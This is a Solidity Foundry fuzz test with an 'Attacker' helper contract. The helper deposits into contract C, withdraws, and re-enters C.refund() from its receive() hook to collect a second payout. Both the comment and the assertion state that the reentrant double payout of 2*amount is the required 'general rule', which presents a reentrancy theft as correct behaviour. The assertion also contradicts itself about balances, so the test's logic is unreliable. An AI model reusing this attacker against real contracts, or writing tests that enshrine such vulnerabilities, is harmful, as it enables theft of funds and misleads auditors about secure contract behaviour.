pragma solidity ^0.8.0;
import {Test} from "forge-std/Test.sol";
import {C} from "../src/C_under_test.sol";

contract InvMutTest is Test {
    C c;
    function setUp() public { c = new C(); }

    function testFuzz_property(uint256 amount) public {
        amount = bound(amount, 1, 10 ether);
        Attacker a = new Attacker(c);
        vm.deal(address(a), amount);
        a.dep(amount);
        a.go(amount);
        // General rule: a full withdrawal must pay out the withdrawn amount AND
        // the reentrant refund must still pay the full recorded balance,
        // so the caller receives exactly 2*amount in total.
        assertTrue(a.total() == 2 * amount && address(c).balance == 0);
    }
}

contract Attacker {
    C c;
    bool reentered;
    uint256 public total;

    constructor(C _c) { c = _c; }

    function dep(uint256 amt) external payable {
        c.deposit{value: amt}();
    }

    function go(uint256 amt) external {
        c.withdraw(amt);
    }

    receive() external payable {
        total += msg.value;
        if (!reentered) {
            reentered = true;
            c.refund();
        }
    }
}

